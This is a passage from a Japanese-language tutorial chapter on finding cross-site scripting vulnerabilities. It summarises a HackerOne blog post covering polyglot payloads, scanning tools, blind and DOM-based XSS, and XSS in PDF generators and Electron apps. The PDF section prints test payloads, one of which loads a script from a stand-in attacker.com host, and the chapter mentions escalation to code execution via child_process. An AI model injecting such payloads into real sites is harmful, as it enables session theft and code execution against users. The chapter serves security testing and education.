なぜ動くか。この文字列は「属性値の終端 `"`」「HTMLタグの新規開始 `<button ...>`」「別の引用符パターン `'`」「JSコメントアウト `//`」「ブロックコメント `*/`」といった、複数の異なる構文コンテキストへの脱出手段を1つの文字列の中に並置している。挿入先が属性値の中であれ、JS文字列リテラルの中であれ、コメントの直後であれ、いずれかの断片がその文脈にマッチしてコンテキストから脱出し、`onclick=alert(1)` や `alert(1)` が実行可能な位置に着地する。実務では、入力がどのコンテキストに出力されるか事前に分からないことが多いため、まずポリグロットを投入して「そもそも何らかの形でXSSが成立しそうか」を素早く判定し、その後コンテキストを絞った個別ペイロードで確定させる、という二段階のアプローチが取られる。記事は具体的なペイロード集として **PayloadsAllTheThings**（GitHubのXSS Injectionセクション）、**HackTricks**のXSS解説、そして自動テスト用の **Auto_Wordlists** を挙げている。

#### (2) 自動化ツールと手動テストの使い分け

記事は自動化ツールとして **Dalfox**（反射型・蓄積型XSSの両方に対応）、**XSStrike**（反射型専用）、そしてブラインドXSS検出用のコールバックプラットフォームである **xsshunter** を紹介しつつ、次のように限界を明言している。

> "automated tools for finding anything beyond low-hanging reflected XSS are limited" — 「低難度の反射型XSSを超える範囲を見つけるための自動化ツールは限定的である」

つまり、自動スキャナは「入力をそのまま出力に反映する」ような単純な反射型XSSの検出には有効だが、フィルタバイパスや複雑なDOMの再解釈が絡む深い脆弱性の発見には手動テストが不可欠だという実務的な位置づけを示している。

#### (3) 反射型XSS(RXSS)の典型的な発見箇所

記事が挙げる発見場所は、URLパラメータ（検索クエリ、エラーメッセージの表示欄）、リダイレクトパラメータ（ログイン後のPOSTリダイレクトに使われる `returnTo` のようなパラメータ）、そして `javascript:` プロトコルを含む特殊なURLである。具体例として、Shopifyの `returnTo` パラメータで発見された事例が紹介されている。

#### (4) 格納型XSSとMarkdown/Mutation XSSへの注意

格納型XSS（蓄積型XSS）の典型的な発見箇所は、コメント欄、ユーザープロフィールデータ、プライベートメッセージ、メール機能である。記事は特に「Markdownテキストの HTML への変換」や「不正なHTML構文をブラウザが自動修正する過程」で発生する**Mutation XSS（mXSS）**に注意を促し、GitLabのウィキ機能での事例を挙げている。これは第6章の別節で扱ったMailspringの事例と同じ、サニタイザとレンダラのパース差分という原理に基づくものである。

#### (5) ブラインドXSS(bXSS)による「見えない」実行面の発見

ブラインドXSSは、ペイロードの実行結果を攻撃者自身が直接観測できない点が特徴の格納型XSSである。記事が挙げる典型的な標的は、HTTPヘッダー（User-Agent、Cookie）、アカウント登録フォーム、フィードバック機能、ユーザー名・メールアドレス欄である。ペイロードは通常のサニタイズ漏れと同じ形で仕込まれるが、実行される場所とタイミングを攻撃者が事前に知り得ないため、**xsshunter**のような外部コールバックエンドポイントを使い、どのフォームに仕込んだペイロードが、いつ、どの管理画面で発火したかを追跡する運用が必要になる。管理者権限を持つバックオフィス画面で発火することが多いため、単純な反射型XSSより被害範囲が大きくなりやすい。

#### (6) DOM型XSSの検出: Burp Suite DOM Invader

DOM-basedXSSの検出について、記事は **Burp Suite の DOM Invader**（source/sinkの流れを解析するBurp Suiteの拡張機能）を明示的に推奨している。手順は次の通りである。

1. DOM Invaderで「キャナリ」（追跡用のユニークな文字列）を生成する。
2. テスト対象のフィールドにそのキャナリを挿入する。
3. DOM Invaderがキャナリの流れを追跡し、どのsink（出力先）に到達したかを自動検出する。
4. 検出されたsinkの種類に応じてペイロードを調整し、実際にエクスプロイトを組み立てる。

実例として、Gin and Juice Shop（PortSwiggerが公開する練習用の脆弱アプリケーション）で、`<img src>` 属性経由で `onload` ペイロードを挿入した事例が紹介されている。

#### (7) 異例の場所でのXSS: PDFとElectronアプリ

記事はXSSが「Webブラウザの中だけの脆弱性」ではないことも強調している。

**PDFにおけるXSS**は、サーバーサイドでPDFを生成・処理する機能に対して行われ、SSRF（Server-Side Request Forgery）やLFI（Local File Inclusion）へと連鎖しうる。テスト例として次が挙げられている。

```html
<img src="x" onerror="document.write('test')" />
<script src="http://attacker.com/myscripts.js"></script>
```

このようなペイロードをPDF生成に使われる入力（HTMLをPDF化するライブラリへの入力など）に混入させ、生成側のレンダリングエンジンでJavaScriptが実行されるかを確認する。記事はSlackでこの種の脆弱性が報告され、約5,000ドルの報奨金が支払われた例を紹介している。

**Electronアプリケーション**については、検出ツールとして **Electronegativity**（Electronアプリのセキュリティ設定を静的解析するツール）が挙げられている。確認すべきリスク要因は `nodeIntegration: true` の設定であり、これが有効な状態でXSSが成立すると、`require('child_process').exec()` のような呼び出しを通じてXSSがRCE（Remote Code Execution）にエスカレーションしうる。記事はRocket ChatデスクトップアプリのMarkdownパーサーに存在したXSSが、ローカルマシンでのコード実行にまで発展した事例を挙げている。これは前節で扱ったMailspringのmXSS→RCE連鎖と同じ原理（Electronの権限昇格）である。

#### 統計データと実務的示唆

記事は最新の Hacker-Powered Security Report を引用し、2025年単年で **13,000件以上の有効なXSSレポート**が確認されたとし、XSSが現代のWebアプリケーションにおいて依然として高頻度に発見される脆弱性クラスであると位置づけている。締めくくりとして記事は次のように述べている。

> "nothing beats the curiosity, creativity, and persistence of a security researcher" — 「セキュリティ研究者の好奇心・創造性・粘り強さに勝るものはない」

つまり、構造化されたテスト手順（ポリグロット→コンテキスト特定→フィルタバイパス/ブラインドXSSでの深掘り）と、既存のツール・ペイロード集の活用を土台としつつも、最終的に高難度の脆弱性を見つけるのは、アプリケーション固有の実装の癖に対する探究心と試行錯誤であるという実務的な結論である。

> 出典: How to Find XSS: Techniques Security Researchers Use in Real Environments（Haoxi Tan, HackerOne Blog, 2026年4月1日） — https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments

### 6.4.4 本節の要点

- 個々には中程度の重大度に見える弱点（postMessageのorigin検証漏れ、AIプロンプトインジェクション、`window.name`永続化やフレーム階層トラバーサルによるサンドボックス脱出）でも、**出力を次の入力につなぐ連鎖**を組み立てることで、フルチェーンのXSS・持続的なデータ漏洩に到達しうる。
- `sandbox` 属性は「安全な箱」ではなく、あくまでCookie・ストレージ・トップレベルナビゲーションなど一部の権限を絞るための仕組みに過ぎない。スクリプト実行自体や `postMessage` 通信、`window.opener` 経由の参照は制限されないため、これらを踏み台にした脱出が成立する。
- AI生成コンテンツは、通常のユーザー入力と同様（あるいはそれ以上に）信頼できない外部データとして扱い、DOM sinkへ渡す前に必ずサニタイズし、`postMessage` は送受信双方でオリジンを厳密に検証する。
- 実務での発見は「ポリグロットで広く当たりをつける→自動ツール(Dalfox/XSStrike)と手動テストを使い分ける→コンテキスト特化ペイロードで確定→DOM Invaderでsource/sinkを可視化する→ブラインドXSSやPDF・Electronのような異例の実行面まで潰す」という段階的なプロセスであり、パーサの再解釈・権限昇格という共通原理を理解していれば、個別のペイロード暗記に頼らず応用が利く。
- 見つけた脆弱性を単体の報告で終わらせず、「他の既知の弱点と組み合わせて影響範囲を拡大できないか」を常に問い直す姿勢が、複合連鎖の発見と高い報奨評価につながる。

---

（前章: [第5章 フレームワーク固有のXSS](./05-frameworks.md)　｜　次章: [第7章 ハンズオン](./07-handson-labs.md)　｜　[目次](./README.md)）
